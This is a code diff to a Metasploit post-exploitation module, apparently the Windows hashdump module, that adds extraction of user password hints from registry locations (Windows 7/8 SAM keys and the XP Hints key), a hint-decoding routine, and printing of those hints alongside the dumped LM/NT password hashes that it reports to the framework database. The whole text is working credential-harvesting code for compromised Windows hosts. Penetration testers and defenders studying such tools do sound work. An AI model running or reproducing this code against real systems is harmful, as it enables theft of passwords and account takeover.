@@ -16,6 +16,7 @@ require 'msf/core/post/windows/priv'
 require 'msf/core/post/windows/registry'
 require 'msf/core/post/windows/accounts'
 require 'msf/core/post/file'
+require 'msf/core/auxiliary/report'
 
 class Metasploit3 < Msf::Post
 
@@ -37,7 +38,7 @@ class Metasploit3 < Msf::Post
 				'License'       => MSF_LICENSE,
 				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>'],
 				'Version'       => '$Revision$',
-				'Platform'      => [ 'windows' ],
+				'Platform'      => [ 'win' ],
 				'SessionTypes'  => [ 'meterpreter' ]
 			))
 		register_options(
@@ -140,6 +141,14 @@ class Metasploit3 < Msf::Post
 			users[usr.to_i(16)] ||={}
 			users[usr.to_i(16)][:F] = uk.query_value("F").data
 			users[usr.to_i(16)][:V] = uk.query_value("V").data
+
+			#Attempt to get Hints (from Win7/Win8 Location)
+			begin
+				users[usr.to_i(16)][:UserPasswordHint] = uk.query_value("UserPasswordHint").data
+			rescue ::Rex::Post::Meterpreter::RequestError
+				users[usr.to_i(16)][:UserPasswordHint] = nil
+			end
+
 			uk.close
 		end
 		ok.close
@@ -151,6 +160,17 @@ class Metasploit3 < Msf::Post
 			rid = r.type
 			users[rid] ||= {}
 			users[rid][:Name] = usr
+
+			#Attempt to get Hints (from WinXP Location) only if it's not set yet
+			if users[rid][:UserPasswordHint].nil?
+				begin
+					uk_hint = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Hints\\#{usr}", KEY_READ)
+					users[rid][:UserPasswordHint] = uk_hint.query_value("").data
+				rescue ::Rex::Post::Meterpreter::RequestError
+					users[rid][:UserPasswordHint] = nil
+				end
+			end
+
 			uk.close
 		end
 		ok.close
@@ -180,6 +200,16 @@ class Metasploit3 < Msf::Post
 		end
 
 		users
+	end
+	#-------------------------------------------------------------------------------
+
+	def decode_windows_hint(e_string)
+		d_string = ""
+		e_string.scan(/..../).each do |chunk|
+			bytes = chunk.scan(/../)
+			d_string += (bytes[1] + bytes[0]).to_s.hex.chr
+		end
+		d_string
 	end
 	#-------------------------------------------------------------------------------
 
@@ -273,12 +303,23 @@ class Metasploit3 < Msf::Post
 			print_status("\tDecrypting user keys...")
 			users    = decrypt_user_keys(hbootkey, users)
 
-			print_status("\tDumping password hashes...")
+			print_status("\tDumping password hints...")
+			hint_count = 0
+			users.keys.sort{|a,b| a<=>b}.each do |rid|
+				#If we have a hint then print it
+				if !users[rid][:UserPasswordHint].nil? && users[rid][:UserPasswordHint].length > 0
+					print_good("\t#{users[rid][:Name]}:\"#{users[rid][:UserPasswordHint]}\"")
+					hint_count += 1
+				end
+			end
+			print_status("\tNo users with password hints on this system") if hint_count == 0
 
+			print_status("\tDumping password hashes...")
 			users.keys.sort{|a,b| a<=>b}.each do |rid|
 				# next if guest account or support account
 				next if rid == 501 or rid == 1001
 				collected_hashes << "#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::\n"
+
 				print_good("\t#{users[rid][:Name]}:#{rid}:#{users[rid][:hashlm].unpack("H*")[0]}:#{users[rid][:hashnt].unpack("H*")[0]}:::")
 				session.framework.db.report_auth_info(
 					:host  => host,
@@ -289,7 +330,6 @@ class Metasploit3 < Msf::Post
 					:type  => "smb_hash"
 				)
 			end
-
 
 		rescue ::Interrupt
 			raise $!
